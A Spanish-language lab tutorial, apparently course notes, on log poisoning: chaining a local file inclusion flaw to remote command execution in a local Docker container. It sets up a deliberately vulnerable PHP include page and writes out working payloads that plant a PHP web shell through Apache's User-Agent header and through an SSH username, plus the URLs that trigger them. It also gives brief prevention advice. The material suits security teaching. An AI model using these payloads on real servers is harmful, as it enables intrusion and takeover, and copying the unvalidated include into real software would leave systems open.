# Log Poisoning (LFI to RCE)

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

## Prueba de Concepto

* Desplegar contenedor:

```bash
❯ docker pull ubuntu:latest
❯ docker run -dit -p 80:80 -p 22:22 --name logPoisoning ubuntu
❯ docker exec -it logPoisoning bash

root@86c2363bb0de:/# apt update
root@86c2363bb0de:/# apt install apache2 ssh nano php -y
root@86c2363bb0de:/# service apache2 start 
root@86c2363bb0de:/# service ssh start
 * Starting OpenBSD Secure Shell server sshd                                                                       [ OK ]
root@86c2363bb0de:/# service ssh status
 * sshd is running
root@86c2363bb0de:/# service apache2 status
 * apache2 is running
root@86c2363bb0de:/# cd /var/www/html/
root@86c2363bb0de:/var/www/html# nano index.php
```

### Log Poisoning a través de apache

* Crear archivo.php para incluir **archivos** locales de la máquina a través del parámetro **cmd**:

```php
<?php
	include($_GET['filename']);
?>
```

* Cambiar el propietario donde reside los logs de apache2:

```bash
root@86c2363bb0de:/var/www/html# chown www-data:www-data -R /var/log/apache2
```

* Enviar una **peticion** por GET para ejecutar la función **phpinfo()** en el User-Agent y verla en el archivo de logs **/var/log/apache2/access.log** en el navegador web:

```bash
❯ curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo(); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

* Enviar una **petición** por GET para ejecutar comandos a través del parámetro **cmd** en el User-Agent dentro del el navegador web:

```bash
❯ curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

**➜** `view-source:http://localhost/index.php?filename=/var/log/apache2/access.log&cmd=comando`

### Log Poisoning a través de SSH

* A través de **ssh** también podemos llegar a poder ejecutar **comandos** a través del parámetro **cmd** dentro del navegador web:

```bash
❯ ssh '<?php system($_GET["cmd"]); ?>'@ip-host
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ECDSA key fingerprint is SHA256:Uf9VlBUBjpEKfiRb+gas59glyHOT5TMhhhpNtVFYTYQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ECDSA) to the list of known hosts.
<?php system($_GET["cmd"]); ?>@172.17.0.2's password: 
Permission denied, please try again.
<?php system($_GET["cmd"]); ?>@172.17.0.2's password: 
```

* En el navegador **concatenamos** el parámetro **cmd** para poder ejecutar comandos:

**➜** `view-source:http://localhost/index.php?filename=/var/log/btmp&cmd=comando`
